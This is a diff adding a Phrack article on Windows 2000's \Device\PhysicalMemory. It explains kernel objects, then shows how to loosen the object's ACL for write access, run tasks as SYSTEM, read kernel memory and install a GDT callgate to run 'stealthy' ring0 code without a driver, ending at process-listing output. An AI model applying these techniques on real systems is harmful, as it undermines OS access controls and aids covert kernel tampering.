@@ -1,0 +1,1933 @@
+
+                             ==Phrack Inc.==
+
+               Volume 0x0b, Issue 0x3b, Phile #0x10 of 0x12
+
+|=----------------=[ Playing with Windows /dev/(k)mem ]=-----------------=|
+|=-----------------------------------------------------------------------=|
+|=---------------=[ crazylord <crazylord@minithins.net> ]=---------------=|
+
+
+1 - Introduction
+
+2 - Introduction to Windows Objects
+  2.1 What are they ?
+  2.2 Their structure
+  2.3 Objects manipulation
+  
+3 - Introduction to \Device\PhysicalMemory
+  3.1 The object
+  3.2 Need writing access ?
+  
+4 - Having fun with \Device\PhysicalMemory
+  4.1 Reading/Writing to memory
+  4.3 What's a Callgate ?
+  4.4 Running ring0 code without the use of Driver
+  4.2 Deeper into Process listing
+  4.5 Bonus Track
+  
+5 - Sample code
+   5.1 kmem.h
+   5.2 chmod_mem.c
+   5.3 winkdump.c
+   5.2 winkps.c
+   5.4 fun_with_ipd.c
+
+6 - Conclusion
+
+7 - References
+
+
+
+
+--[ 1 - Introduction
+
+This papers covers an approch to Windows /dev/kmem linux like object. My 
+research has been done on a Windows 2000 professional version that means 
+that most of the code supplied with the article should work with all 
+Windows 2000 version and is supposed to work with Windows XP with little 
+code modification.
+Windows 9x/Me are clearly not supported as they are not based on the same 
+kernel architecture.
+
+
+--[ 2 - Introduction to Windows Objects
+
+Windows 2000 implements an object models to provide a way of easy 
+manipulating the most basic elements of the kernel. We will briefly see in 
+this chapter what are these objects and how we can manipulate them.
+
+
+----[ 2.1 What are they ?
+
+According to Microsoft, the object manager was designed to meet these goals
+   * use named object for easy recognition
+   * support POSIX subsystem
+   * provide a easy way for manipulating system resources
+   * provide a charge mechanism to limit resource used by a process
+   * be C2 security compliant :) (C2: Controlled Access Protection)
+
+There are 27 differents objects types:
+
+   * Adapter       * File             * Semaphore
+   * Callback      * IoCompletion     * SymbolicLink
+   * Controler     * Job              * Thread
+   * Desktop       * Key              * Timer
+   * Device        * Mutant           * Token
+   * Directory     * Port             * Type
+   * Driver        * Process          * WaitablePort
+   * Event         * Profile          * WindowStation
+   * EventPair     * Section          * WmiGuid
+
+Most of these names are explicit enough to understand what's they are 
+about. I will just explain some obscure names:
+   * an EventPair is just a couple of 2 Event objects.
+   * a Mutant also called Mutex is a synchronization mechanism for resource
+     access.
+   * a Port is used by the LPC (Local Procedure Call) for Inter-Processus 
+     Communication.
+   * a Section (file mapping) is a region of shared memory.
+   * a Semaphore is a counter that limit access to a resource.
+   * a Token (Access Token) is the security profile of an object.
+   * a WindowStation is a container object for desktop objects.
+
+Objects are organised into a directory structure which looks like this:
+
+   - \
+     - ArcName                 (symbolic links to harddisk partitions)
+     - NLS                     (sections ...)
+     - Driver                  (installed drivers)
+     - WmiGuid
+     - Device                  (/dev linux like)
+       - DmControl
+         - RawDmVolumes
+       - HarddiskDmVolumes
+         - PhysicalDmVolumes
+     - Windows
+       - WindowStations
+     - RPC Control
+     - BaseNamedObjects
+       - Restricted
+     - ??                      (current user directory)
+     - FileSystem              (information about installable files system)
+     - ObjectTypes             (contains all avaible object types)
+     - Security
+     - Callback
+     - KnownDlls               (Contains sections of most used DLL)
+
+The "??" directory is the directory for the current user and "Device" could
+be assimiled as the "/dev" directory on Linux. You can explore these 
+structures using WinObj downloadable on Sysinternals web sites (see [1]).
+
+
+----[ 2.2 Their structure
+
+Each object is composed of 2 parts: the object header and the object body.
+Sven B. Schreiber defined most of the non-documented header related 
+structures in his book "Windows 2000 Undocumented Secrets". Let's see the
+header structure.
+
+---
+from w2k_def.h:
+
+typedef struct _OBJECT_HEADER {
+/*000*/ DWORD        PointerCount;       // number of references
+/*004*/ DWORD        HandleCount;        // number of open handles
+/*008*/ POBJECT_TYPE ObjectType;         // pointer to object type struct
+/*00C*/ BYTE         NameOffset;         // OBJECT_NAME offset
+/*00D*/ BYTE         HandleDBOffset;     // OBJECT_HANDLE_DB offset
+/*00E*/ BYTE         QuotaChargesOffset; // OBJECT_QUOTA_CHARGES offset
+/*00F*/ BYTE         ObjectFlags;        // OB_FLAG_*
+/*010*/ union
+        { // OB_FLAG_CREATE_INFO ? ObjectCreateInfo : QuotaBlock
+/*010*/    PQUOTA_BLOCK        QuotaBlock;
+/*010*/    POBJECT_CREATE_INFO ObjectCreateInfo;
+        };
+/*014*/ PSECURITY_DESCRIPTOR SecurityDescriptor;
+/*018*/ } OBJECT_HEADER, *POBJECT_HEADER;
+---
+
+Each offset in the header are negative offset so if you want to find the 
+OBJECT_NAME structure from the header structure, you calculate it by doing:
+             address = object_header_address - name_offset
+
+OBJECT_NAME structure allows the creator to make the object visible to 
+other processes by giving it a name.
+OBJECT_HANDLE_DB structure allows the kernel to track who is currently 
+using this object.
+OBJECT_QUOTA_CHARGES structure defines the resource charges levied against 
+a process when accessing this object.
+The OBJECT_TYPE structure stocks global informations about the object type 
+like default security access, size of the object, default charge levied to 
+process using an object of this type, ...
+
+A security descriptor is bound to the object so the kernel can restrict 
+access to the object.
+
+Each object type have internal routines quite similar to C++ object 
+constructors and destructors:
+   * dump method       - maybe for debugging purpose (always NULL)
+   * open method       - called when an object handle is opened
+   * close method      - called when an object handle is closed
+   * delete method     - called when an object is deleted
+   * parse method      - called when searching an object in a list of              
+                         object
+   * security method   - called when reading/writing a protection for the 
+                         current object
+   * query name method - called when a thread request the name of the         
+                         object
+   * "ok to close"     - called when a thread is closing a handle
+
+The object body structure totally depends on the object type.
+A very few object body structure are documented in the DDK. If you are
+interested in these structures you may google :) or take a look at 
+chapeaux-noirs home page in the kernel_reversing section (see [4]).
+
+
+---- [ 2.3 Object manipulation
+
+On the user-mode point of view, objects manipulation is done through the 
+standart Windows API. For example, in order to access a file object you can
+use fopen()/open() which will call CreateFile(). At this point, we switch 
+to kernel-mode (NtCreateFile()) which call IoCreateFile() in ntoskrnl.exe.
+As you can see, we still don't know we are manipulating an "object".
+By disassembling IoCreateFile(), you will see some function like 
+ObOpenObjectByName, ObfDereferenceObject, ...
+
+(By the way you will only see such functions if you have win2k symbols
+downloadable on Microsoft DDK web site (see [2]) and disassemblingbwith a
+disassembler supporting Windows Symbols files like IDA/kd/Softicevbecause
+these functions are not exported.)
+
+Each function's name begining with "Ob" is related to the Object Manager.
+So basically, a standart developper don't have to deal with object but we
+want to.
+
+All the object manager related function for user-mode are exported by 
+ntdll.dll. Here are some examples:
+NtCreateDirectoryObject, NtCreateSymbolicLinkObject, NtDuplicateObject,
+NtMakeTemporaryObject, NtOpenDirectoryObject, ...
+Some of these functions are documented in the MSDN some (most ?) are not.
+
+If you really want to understand the way object works you should better
+take a look at the exported function of ntoskrnl.exe beginning with "Ob".
+21 functions exported and 6 documented =]
+
+If you want the prototypes of the 15 others, go on the ntifs.h home page
+(see [3]) or to chapeaux-noirs web site (see [4]).
+
+
+--[ 3 - Introduction to \Device\PhysicalMemory
+
+As far as i know, \Device\PhysicalMemory object was discovered by 
+Mark Russinovich from Sysinternals (see [1]). He coded the first code using
+it : Physmem avaible on his site. Enough greeting :), now we will try to 
+understand what is this object used for and what we can do with it.
+
+
+----[ 3.1 - the object
+
+In order to look at the object information, we are going to need a tool 
+like the Microsoft Kernel Debugger avaible in the Microsoft DDK (see [2]).
+Ok let's start working ...
+
+Microsoft(R) Windows 2000 Kernel Debugger
+Version 5.00.2184.1
+Copyright (C) Microsoft Corp. 1981-1999
+
+Symbol search path is: c:\winnt\symbols
+
+Loading Dump File [livekd.dmp]
+Full Kernel Dump File
+
+Kernel Version 2195 UP Free
+Kernel base = 0x80400000 PsLoadedModuleList = 0x8046a4c0
+Loaded kdextx86 extension DLL
+Loaded userkdx extension DLL
+Loaded dbghelp extension DLL
+f1919231 eb30             jmp     f1919263
+kd> !object \Device\PhysicalMemory
+!object \Device\PhysicalMemory
+Object: e1001240  Type: (fd038880) Section
+    ObjectHeader: e1001228
+    HandleCount: 0  PointerCount: 3
+    Directory Object: fd038970  Name: PhysicalMemory
+    
+The basic object parser from kd (kernel debugger) tells us some information
+about it. No need to explain all of these field means, most of them are 
+explicit enough if you have readen the article from the beginning if not 
+"jmp dword Introduction_to_Windows_Objects".
+Ok the interesting thing is that it's a Section type object so that 
+clearly mean that we are going to deal with some memory related toy.
+
+Now let's dump the object's header structure.
+kd> dd e1001228 L 6
+dd e1001228 L 6
+e1001228  00000003 00000000 fd038880 12200010
+e1001238  00000001 e1008bf8
+
+details:
+--> 00000003 : PointerCount = 3
+--> 00000000 : HandleCount  = 0
+--> fd038880 : pointer to object type = 0xfd038880
+--> 12200010 --> 10 : NameOffset
+             --> 00 : HandleDBOffset
+             --> 20 : QuotaChargeOffset
+             --> 12 : ObjectFlags = OB_FLAG_PERMANENT & OB_FLAG_KERNEL_MODE
+--> 00000001 : QuotaBlock
+--> e1008bf8 : SecurityDescriptor           
+
+Ok the NameOffset exists, well no surprise, this object has a name .. but 
+the HandleDBOffset don't. That means that the object doesnt track handle 
+assigned to it. The QuotaChargeOffset isn't really interesting and the 
+ObjectFlags tell us that this object is permanent and has been created by 
+the kernel.
+For now nothing very interesting ...
+
+We dump the object's name structure just to be sure we are not going the
+wrong way :). (Remember that offset are negative).
+
+kd> dd e1001228-10 L3
+dd e1001228-10 L3
+e1001218  fd038970 001c001c e1008ae8
+
+--> fd038970 : pointer to object Directory
+--> 001c001c --> 001c : UNICODE_STRING.Length
+             --> 001c : UNICODE_STRING.MaximumLength
+--> e1008ae8 : UNICODE_STRING.Buffer (pointer to wide char string)
+
+kd> du e1008ae8
+du e1008ae8
+e1008ae8  "PhysicalMemory"
+
+Ok now, let's look at the interesting part, the security descriptor:
+
+kd> !sd e1008bf8
+!sd e1008bf8
+->Revision: 0x1
+->Sbz1    : 0x0
+->Control : 0x8004
+            SE_DACL_PRESENT
+            SE_SELF_RELATIVE
+->Owner   : S-1-5-32-544
+->Group   : S-1-5-18
+->Dacl    :
+->Dacl    : ->AclRevision: 0x2
+->Dacl    : ->Sbz1       : 0x0
+->Dacl    : ->AclSize    : 0x44
+->Dacl    : ->AceCount   : 0x2
+->Dacl    : ->Sbz2       : 0x0
+->Dacl    : ->Ace[0]: ->AceType: ACCESS_ALLOWED_ACE_TYPE
+->Dacl    : ->Ace[0]: ->AceFlags: 0x0
+->Dacl    : ->Ace[0]: ->AceSize: 0x14
+->Dacl    : ->Ace[0]: ->Mask : 0x000f001f
+->Dacl    : ->Ace[0]: ->SID: S-1-5-18
+
+->Dacl    : ->Ace[1]: ->AceType: ACCESS_ALLOWED_ACE_TYPE
+->Dacl    : ->Ace[1]: ->AceFlags: 0x0
+->Dacl    : ->Ace[1]: ->AceSize: 0x18
+->Dacl    : ->Ace[1]: ->Mask : 0x0002000d
+->Dacl    : ->Ace[1]: ->SID: S-1-5-32-544
+
+->Sacl    :  is NULL
+
+In other words that means that the \Device\PhysicalMemory object has this 
+following rights:
+
+user SYSTEM: Delete, Change Permissions, Change Owner, Query Data,
+             Query State, Modify State
+user Administrator: Query Data, Query State
+
+So basically, user Administrator as no right to Write here but user 
+SYSTEM do, so that mean that Administrator does too.
+
+You have to notice that in fact THIS IS NOT LIKE /dev/kmem !!
+/dev/kmem maps virtual memory on Linux, \Device\PhysicalMemory maps 
+physical memory, the right title for this article should be "Playing with 
+Windows /dev/mem" as /dev/mem maps physical memory but /dev/kmem sounds
+better and much more wellknown :).
+As far as i know the Section object body structure hasn't been yet reversed 
+as i'm writing the article so we can't analyze it's body.
+
+
+----[ 3.2 need writing access ?
+
+Ok .. we are user administrator and we want to play with our favourite
+Object, what can we do ? As most Windows administrators should know it is
+possible to run any process as user SYSTEM using the schedule service.
+If you want to be sure that you can, just start the schedule with 
+"net start schedule" and then try add a task that launch regedit.exe
+c:\>at <when> /interactive regedit.exe
+After that try to look at the SAM registry key, if you can, you are user 
+SYSTEM otherwise you are still administrator since only user SYSTEM has 
+reading rights.
+
+Ok that's fine if we are user Administrator but what's up if we want to 
+allow somebody/everyone to write to \Device\PhysicalMemory
+(for learning purpose off course).
+We just have to add another ACL (access-control list) to this object.
+To do this you have to follow these steps:
+
+   1) Open a handle to \Device\PhysicalMemory (NtOpenSection)
+   2) Retrieve the security descriptor of it (GetSecurityInfo)
+   3) Add Read/Write authorization to the current ACL (SetEntriesInAcl)
+   4) Update the security descriptor (SetSecurityInfo)
+   5) Close the handle previously opened
+
+see chmod_mem.c sample code.
+
+After having run chmod_mem.exe we dump another time the security descriptor
+ of \Device\PhysicalMemory.
+
+kd> !object \Device\PhysicalMemory
+!object \Device\PhysicalMemory
+Object: e1001240  Type: (fd038880) Section
+    ObjectHeader: e1001228
+    HandleCount: 0  PointerCount: 3
+    Directory Object: fd038970  Name: PhysicalMemory
+kd> dd e1001228+0x14 L1
+dd e1001228+0x14 L1
+e100123c  e226e018
+kd> !sd e226e018
+!sd e226e018
+->Revision: 0x1
+->Sbz1    : 0x0
+->Control : 0x8004
+            SE_DACL_PRESENT
+            SE_SELF_RELATIVE
+->Owner   : S-1-5-32-544
+->Group   : S-1-5-18
+->Dacl    :
+->Dacl    : ->AclRevision: 0x2
+->Dacl    : ->Sbz1       : 0x0
+->Dacl    : ->AclSize    : 0x68
+->Dacl    : ->AceCount   : 0x3
+->Dacl    : ->Sbz2       : 0x0
+->Dacl    : ->Ace[0]: ->AceType: ACCESS_ALLOWED_ACE_TYPE
+->Dacl    : ->Ace[0]: ->AceFlags: 0x0
+->Dacl    : ->Ace[0]: ->AceSize: 0x24
+->Dacl    : ->Ace[0]: ->Mask : 0x00000002
+->Dacl    : ->Ace[0]: ->SID: S-1-5-21-1935655697-436374069-1060284298-500
+
+->Dacl    : ->Ace[1]: ->AceType: ACCESS_ALLOWED_ACE_TYPE
+->Dacl    : ->Ace[1]: ->AceFlags: 0x0
+->Dacl    : ->Ace[1]: ->AceSize: 0x14
+->Dacl    : ->Ace[1]: ->Mask : 0x000f001f
+->Dacl    : ->Ace[1]: ->SID: S-1-5-18
+
+->Dacl    : ->Ace[2]: ->AceType: ACCESS_ALLOWED_ACE_TYPE
+->Dacl    : ->Ace[2]: ->AceFlags: 0x0
+->Dacl    : ->Ace[2]: ->AceSize: 0x18
+->Dacl    : ->Ace[2]: ->Mask : 0x0002000d
+->Dacl    : ->Ace[2]: ->SID: S-1-5-32-544
+
+->Sacl    :  is NULL
+
+Our new Ace (access-control entry) is Ace[0] with a 0x00000002
+(SECTION_MAP_WRITE) right.
+For more information about Security win32 API see MSDN ([9]).
+
+
+--[ 4 - Having fun with \Device\PhysicalMemory
+
+Why playing with \Device\PhysicalMemory ? reading, writing, patching memory
+i would say. That should be enough :)
+
+
+----[ 4.1 Reading/Writing to memory
+
+Ok let's start playing...
+In order to read/write to \Device\PhysicalMemory, you have do this way:
+
+   1) Open a Handle to the object (NtOpenSection)
+   2) Translate the virtual address into a physical address
+   3) Map the section to a memory space (NtMapViewOfSection)
+   4) Read/Write data where the memory has been mapped
+   5) Unmap the section (NtUnmapViewOfSection)
+   6) Close the object's Handle (NtClose)
+   
+Our main problem for now is how to translate the virtual address to a 
+physical address. We know that in kernel-mode (ring0), there is a function 
+called MmGetPhysicalAddress exported by ntoskrnl.exe which do that.
+But we are in ring3 so we have to "emulate" such function. 
+
+---
+from ntddk.h
+PHYSICAL_ADDRESS MmGetPhysicalAddress(void *BaseAddress);
+---
+
+PHYSICAL_ADDRESS is a quad-word (64 bits). At the beginning i wanted to
+join with the article the analysis of the assembly code but it's too long.
+And as address translation is sort of generic (cpu relative) i only go fast
+on this subject.
+
+The low part of the quad-word is passed in eax and the high part in edx.
+For virtual to physical address translation we have 2 cases:
+
+ * case 0x80000000 <= BaseAddress < 0xA0000000:
+the only thing we need to do is to apply a 0x1FFFF000 mask to the virtual
+address.
+
+ * case BaseAddress < 0x80000000 && BaseAddress >= 0xA0000000
+This case is a problem for us as we have no way to translate addresses in
+this range because we need to read cr3 register or to run non ring3
+callable assembly instruction. For more information about Paging on Intel
+arch take a look at Intel Software Developer's Manual Volume 3 (see [5]).
+EliCZ told me that by his experience we can guess a physical address for
+this range by masking the byte offset and keeping a part of the page
+directory index. mask: 0xFFFF000.
+
+We can know produce a light version of MmGetPhysicalAddress()
+
+PHYSICAL_MEMORY MyGetPhysicalAddress(void *BaseAddress) {
+   if (BaseAddress < 0x80000000 || BaseAddress >= 0xA0000000) {
+      return(BaseAddress & 0xFFFF000);
+   }
+   return(BaseAddress & 0x1FFFF000);
+}
+
+The problem with the addresses outside the [0x80000000, 0xA0000000] is that
+they can't be guessed with a very good sucess rate.
+That's why if you want good results you would rather call the real
+MmGetPhysicalAddress(). We will see how to do that in few chapter.
+
+See winkdump.c for sample memory dumper.
+
+After some tests using winkdump i realised that in fact there is another
+problem in our *good* range :>. When translating virtual address above
+0x877ef000 the physical address is getting above 0x00000000077e0000.
+And on my system this is not *possible*:
+
+kd> dd MmHighestPhysicalPage l1
+dd MmHighestPhysicalPage l1
+8046a04c  000077ef
+
+We can see that the last physical page is locate at 0x0000000077ef0000.
+So in fact that means that we can only dump a small section of the memory.
+But anyway the goal of this chapter is much more an explaination about
+how to start using \Device\PhysicalMemory than to create a *good* memory
+dumper. As the dumpable range is where ntoskrnl.exe and HAL.dll (Hardware
+Abstraction Layer) are mapped you can still do some stuff like dumping the
+syscall table:
+
+kd> ? KeServiceDescriptorTable
+? KeServiceDescriptorTable
+Evaluate expression: -2142852224 = 8046ab80
+
+0x8046ab80 is the address of the System Service Table structure
+which looks like:
+
+typedef struct _SST {
+   PDWORD  ServiceTable;           // array of entry points
+   PDWORD  CounterTable;           // array of usage counters
+   DWORD   ServiceLimit;           // number of table entries
+   PBYTE   ArgumentTable;          // array of byte counts
+} SST, *PSST;
+
+C:\coding\phrack\winkdump\Release>winkdump.exe 0x8046ab80 16
+ *** win2k memory dumper using \Device\PhysicalMemory ***
+
+ Virtual Address       : 0x8046ab80
+ Allocation granularity: 65536 bytes
+ Offset                : 0xab80
+ Physical Address      : 0x0000000000460000
+ Mapped size           : 45056 bytes
+ View size             : 16 bytes
+
+d8 04 47 80 00 00 00 00  f8 00 00 00 bc 08 47 80  | ..G...........G.
+
+Array of pointers to syscalls: 0x804704d8 (symbol KiServiceTable)
+Counter table                : NULL
+ServiceLimit                 : 248 (0xf8) syscalls
+Argument table               : 0x804708bc (symbol KiArgumentTable)
+
+We are not going to dump the 248 syscalls addresses but just take a look at
+some:
+
+C:\coding\phrack\winkdump\Release>winkdump.exe 0x804704d8 12
+ *** win2k memory dumper using \Device\PhysicalMemory ***
+
+ Virtual Address       : 0x804704d8
+ Allocation granularity: 65536 bytes
+ Offset                : 0x4d8
+ Physical Address      : 0x0000000000470000
+ Mapped size           : 4096 bytes
+ View size             : 12 bytes
+
+bf b3 4a 80 6b e8 4a 80  f3 de 4b 80              | ..J.k.J...K.
+
+ * 0x804ab3bf (NtAcceptConnectPort)
+ * 0x804ae86b (NtAccessCheck)
+ * 0x804bdef3 (NtAccessCheckAndAuditAlarm)
+
+In the next section we will see what are callgates and how we can use them
+with \Device\PhysicalMemory to fix problems like our address translation
+thing.
+
+
+----[ 4.2 What's a  Callgate
+
+Callgate are mechanisms that enable a program to execute functions in
+higher privilege level than it is. Like a ring3 program could execute ring0
+code.
+In order to create a Callgate yo must specify:
+   1) which ring level you want the code to be executed
+   2) the address of the function that will be executed when jumping to   
+      ring0
+   3) the number of arguments passed to the function
+
+When the callgate is accessed, the processor first performs a privilege
+check, saves the current SS, ESP, CS and EIP registers, then it loads the
+segment selector and stack pointer for the new stack (ring0 stack) from the
+TSS into the SS and ESP registers.
+At this point it can switch to the new ring0 stack.
+SS and ESP registers are pushed onto the stack, the arguments are copied.
+CS and EIP (saved) registers are now pushed onto the stack for the calling
+procedure to the new stack. The new segment selector is loaded for the new
+code segment and instruction pointer from the callgate is loaded into CS
+and EIP registers. Finnaly :) it jumps to the function's address specified
+when creating the callgate.
+
+The function executed in ring0 MUST clean its stack once it has finished
+executing, that's why we are going to use __declspec(naked) (MS VC++ 6)
+when defining the function in our code (similar to __attribute__(stdcall)
+for GCC).
+
+---
+from MSDN:
+__declspec( naked ) declarator
+
+For functions declared with the naked attribute, the compiler generates
+code without prolog and epilog code. You can use this feature to write your
+own prolog/epilog code using inline assembler code.
+---
+
+For more information about callgates look at Intel Software Developer's
+Manual Volume 1 (see [5]).
+
+In order to install a Callgate we have 2 choices: or we manually seek a
+free entry in the GDT where we can place our Callgate or we use some
+undocumented functions of ntoskrnl.exe. But these functions are only
+accessible from ring0. It's useless in our case since we are not in ring0
+but anyway i will very briefly show you them:
+
+NTSTATUS KeI386AllocateGdtSelectors(USHORT *SelectorArray, 
+                                    USHORT nSelectors);
+NTSTATUS KeI386ReleaseGdtSelectors(USHORT *SelectorArray, 
+                                   USHORT nSelectors);
+NTSTATUS KeI386SetGdtSelector(USHORT Selector,
+                              PVOID Descriptor);
+
+Their names are explicits enough i think :). So if you want to install a
+callgate, first allocate a GDT selector with KeI386AllocateGdtSelectors(),
+then set it with KeI386SetGdtSelector. When you are done just release it
+with KeI386ReleaseGdtSelectors.
+
+That's interesting but it doesn't fit our need. So we need to set a GDT
+selector while executing code in ring3. Here comes \Device\PhysicalMemory.
+In the next section i will explain how to use \Device\PhysicalMemory to
+install a callgate.
+
+
+----[ 4.3 Running ring0 code without the use of Driver
+
+First question, "why running ring0 code without the use of Device Driver ?"
+Advantages:
+   * no need to register a service to the SCM (Service Control Manager).
+   * stealth code ;)
+
+Inconvenients:
+   * code would never be as stable as if running from a (well coded) device    
+     driver.
+   * we need to add write access to \Device\PhysicalMemory
+
+So just keep in mind that you are dealing with hell while running ring0
+code through \Device\PhysicalMemory =]
+
+Ok now we can write the memory and we know that we can use callgate to run
+ring0 so what are you waiting ?
+First we need to know what part of the section to map to read the GDT
+table. This is not a problem since we can access the global descriptor
+table register using "sgdt" assembler instruction.
+
+typedef struct _KGDTENTRY {
+   WORD LimitLow; // size in bytes of the GDT
+   WORD BaseLow;  // address of GDT (low part)
+   WORD BaseHigh; // address of GDT (high part)
+} KGDTENTRY, *PKGDTENTRY;
+
+KGDT_ENTRY gGdt;
+_asm sgdt gGdt; // load Global Descriptor Table register into gGdt
+
+We translate the Virtual address from BaseLow/BaseHigh to a physical
+address and then we map the base address of the GDT table.
+We are lucky because even if the GDT table adddress is not in our *wanted*
+range, it will be right translated (in 99% cases).
+
+PhysicalAddress = GetPhysicalAddress(gGdt.BaseHigh << 16 | gGdt.BaseLow);
+
+NtMapViewOfSection(SectionHandle,
+                   ProcessHandle,
+                   BaseAddress,       // pointer to mapped memory
+                   0L,
+                   gGdt.LimitLow,     // size to map
+                   &PhysicalAddress,
+                   &ViewSize,         // pointer to mapped size
+                   ViewShare,
+                   0,                 // allocation type
+                   PAGE_READWRITE);   // protection
+
+Finally we loop in the mapped memory to find a free selector by looking at
+the "Present" flag of the Callgate descriptor structure.
+
+typedef struct _CALLGATE_DESCRIPTOR {
+   USHORT offset_0_15;    // low part of the function address
+   USHORT selector;
+   UCHAR  param_count :4;
+   UCHAR  some_bits   :4;
+   UCHAR  type        :4; // segment or gate type
+   UCHAR  app_system  :1; // segment descriptor (0) or system segment (1)
+   UCHAR  dpl         :2; // specify which privilege level can call it
+   UCHAR  present     :1;
+   USHORT offset_16_31;   // high part of the function address
+} CALLGATE_DESCRIPTOR, *PCALLGATE_DESCRIPTOR;
+
+offset_0_15 and offset_16_31 are just the low/high word of the function
+address. The selector can be one of this list:
+
+--- from ntddk.h
+#define KGDT_NULL       0
+#define KGDT_R0_CODE    8   // <-- what we need (ring0 code)
+#define KGDT_R0_DATA    16
+#define KGDT_R3_CODE    24
+#define KGDT_R3_DATA    32
+#define KGDT_TSS        40
+#define KGDT_R0_PCR     48
+#define KGDT_R3_TEB     56
+#define KGDT_VDM_TILE   64
+#define KGDT_LDT        72
+#define KGDT_DF_TSS     80
+#define KGDT_NMI_TSS    88
+---
+
+Once the callgate is installed there are 2 steps left to supreme ring0
+power: coding our function called with the callgate and call the callgate.
+
+As said in section 4.2, we need to code a function with a ring0
+prolog / epilog and we need to clean our stack. Let's take a look at this
+sample function:
+
+void __declspec(naked) Ring0Func() { // our nude function :]
+   // ring0 prolog
+   _asm {
+      pushad // push eax,ecx,edx,ebx,ebp,esp,esi,edi onto the stack
+      pushfd // decrement stack pointer by 4 and push EFLAGS onto the stack
+      cli    // disable interrupt
+   }
+   
+   // execute your ring0 code here ...
+   
+   // ring0 epilog
+   _asm {
+      popfd // restore registers pushed by pushfd
+      popad // restore registers pushed by pushad
+      retf  // you may retf <sizeof arguments> if you pass arguments
+   }
+}
+
+Pushing all registers onto the stack is the way we use to save all
+registers while the ring0 code execution.
+
+1 step left, calling the callgate...
+A standart call won't fit as the callgate procedure is located in a
+different privilege level (ring0) than the current code privilege level
+(ring3).
+We are doing to do a "far call" (inter-privilege level call).
+So in order to call the callgate you must do like this:
+
+short farcall[3];
+farcall[0 --> 1] = offset from the target operand. This is ignored when a
+callgate is used according to "IA-32 Intel Architecture Software
+Developer's Manual (Volume 2)" (see [5]).
+
+farcall[2] = callgate selector
+
+At this time we can call our callgate using inline assembly.
+
+_asm {
+   push arg1
+   ...
+   push argN
+   call fword ptr [farcall]
+}
+
+I forgot to mention that as it's a farcall first argument is located at
+[ebp+0Ch] in the callgate function.
+
+
+----[ 4.4 Deeper into Process listing
+
+Now we will see how to list process in the kernel the lowest level we can
+do :).
+The design goal of creating a Kernel process lister at the lowest level
+could be to see process hidden by a rootkit (taskmgr.exe patched, Syscall
+hooked, ...).
+
+You remember that Jamirocai song: "Going deeper underground". We will do
+the same. Let's see which way we can use to list process.
+
+   - Process32First/Process32Next, the easy documented way (ground level)
+
+   - NtQuerySystemInformation using Class 5, Native API way. Basicly not
+     documented but there are many sample on internet (level -1)
+
+   - ExpGetProcessInformation, called internally by
+     NtQuerySystemInformation (level -2)
+
+   - Reading the double chained list PsActiveProcessHead (level -3) :p
+
+Ok now we are deep enough.
+The double chained list scheme looks like:
+
+APL (f): ActiveProcessLinks.FLink
+APL (b): ActiveProcessLinks.BLink
+
+        process1          process2          process3          processN
+0x000 |----------|      |----------|      |----------| 
+      | EPROCESS |      | EPROCESS |      | EPROCESS |
+      |   ...    |      |   ...    |      |   ...    |
+0x0A0 |  APL (f) |----->|  APL (f) |----->|  APL (f) |-----> ...
+0x0A4 |  APL (b) | \-<--|  APL (b) | \-<--|  APL (b) | \-<-- ...
+      |   ...    |      |   ...    |      |   ...    |
+      |----------|      |----------|      |----------|
+
+
+As you can see (well ... my scheme is not that good :/) the next/prev
+pointers of the ActiveProcessLinks struct are not _EPROCESS structure
+pointers. They are pointing to the next LIST_ENTRY struct. That means that
+if we want to retrieve the _EPROCESS structure address, we have to adjust
+the pointer.
+
+(look at _EPROCESS struct definition in kmem.h in sample code section)
+LIST_ENTRY ActiveProcessLinks is at offset 0x0A0 in _EPROCESS struct:
+ --> Flink = 0x0A0
+ --> Blink = 0x0A4
+
+So we can quickly create some macros for later use:
+
+#define TO_EPROCESS(_a) ((char *) _a - 0xA0) // Flink to _EPROCESS
+#define TO_PID(_a) ((char *) _a - 0x4)       // Flink to UniqueProcessId
+#define TO_PNAME(_a) ((char *) _a + 0x15C)   // Flink to ImageFileName
+
+The head of the LIST_ENTRY list is PsActiveProcessHead. You can get its
+address with kd for example:
+
+kd> ? PsActiveProcessHead
+? PsActiveProcessHead
+Evaluate expression: -2142854784 = 8046a180
+
+Just one thing to know. As this List can change very quickly, you may want
+to lock it before reading it. Reading ExpGetProcessInformation assembly, we
+can see:
+
+   mov     ecx, offset _PspActiveProcessMutex
+   call    ds:__imp_@ExAcquireFastMutex@4
+   [...]
+   mov     ecx, offset _PspActiveProcessMutex
+   call    ds:__imp_@ExReleaseFastMutex@4
+
+ExAcquireFastMutex and ExReleaseFastMutex are __fastcall defined so the
+arguments are pushed in reverse order (ecx, edx,...). They are exported by
+HAL.dll. By the way i don't lock it in winkps.c :)
+
+Ok, first we install a callgate to be able to execute the ring0 function
+(MmGetPhysicalAddress and ExAcquireFastMutex/ExReleaseFastMutex if you 
+want), then we list the process and finally we remove the callgate.
+
+See winkps.c in sample code section.
+
+Installing the callgate is an easy step as you can see in the sample code.
+The hard part is reading the LIST_ENTRY struct. It's kinda strange because
+reading a chained list is not supposed to be hard but we are dealing with
+physical memory.
+First in order to avoid too much use of our callgate we try to use it as
+less as we can. Remember, running ring0 code in ring3 is not
+*a good thing*.
+Problems could happend on the dispatch level where the thread is executed
+and second your thread (i think) have a lower priority than a device
+driver even if you use SetThreadPriority().
+
+The scheduler base his scheduling on 2 things, the BasePriority of a
+process and his Current priority, when you modify thread priority using
+win32 API SetThreadPriority(), the current priority is changed but it's
+relative to the base priority. And there is no way to change base priority
+of a process in ring3.
+
+So in order to prevent mapping the section for every process i map 1mb
+section each time i need to map one. I think it's the best choice since
+most of the EPROCESS structures are located around 0xfce***** - 0xfcf*****.
+
+C:\coding\phrack\winkps\Release>winkps
+ *** win2k process lister ***
+
+Allocation granularity: 65536 bytes
+MmGetPhysicalAddress   : 0x804374e0
+virtual address of GDT : 0x80036000
+physical address of GDT: 0x0000000000036000
+Allocated segment      : 3fb
+mapped 0xb000 bytes @ 0x00430000 (init Size: 0xa184 bytes)
+mapped 0x100000 bytes @ 0x0043e000 (init Size: 0x100000 bytes)
+ + 8     System
+mapped 0x100000 bytes @ 0x0054e000 (init Size: 0x100000 bytes)
+ + 136   smss.exe
+ + 160   csrss.exe
+ + 156   winlogon.exe
+ + 208   services.exe
+ + 220   lsass.exe
+ + 420   regsvc.exe
+ + 436   svchost.exe
+ + 480   svchost.exe
+ + 524   WinMgmt.exe
+mapped 0x100000 bytes @ 0x0065e000 (init Size: 0x100000 bytes)
+ + 656   Explorer.exe
+ + 764   OSA.EXE
+ + 660   mdm.exe
+ + 752   cmd.exe
